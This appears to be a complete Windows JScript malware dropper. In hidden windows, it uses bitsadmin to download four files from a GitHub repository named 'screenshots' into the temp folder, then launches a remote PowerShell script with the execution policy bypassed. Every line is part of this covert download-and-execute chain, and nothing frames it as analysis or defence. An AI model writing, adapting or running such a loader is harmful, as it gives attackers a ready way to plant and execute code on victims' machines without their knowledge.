var sh=new ActiveXObject("WScript.Shell");
sh.Run("bitsadmin /transfer j /download https://raw.githubusercontent.com/cem324/screenshots/main/c0 %TEMP%\\c0",0);
sh.Run("bitsadmin /transfer j /download https://raw.githubusercontent.com/cem324/screenshots/main/c1 %TEMP%\\c1",0);
sh.Run("bitsadmin /transfer j /download https://raw.githubusercontent.com/cem324/screenshots/main/c2 %TEMP%\\c2",0);
sh.Run("bitsadmin /transfer j /download https://raw.githubusercontent.com/cem324/screenshots/main/c3 %TEMP%\\c3",0);
sh.Run("powershell -ExecutionPolicy Bypass -File https://raw.githubusercontent.com/cem324/screenshots/main/v2.ps1",0);
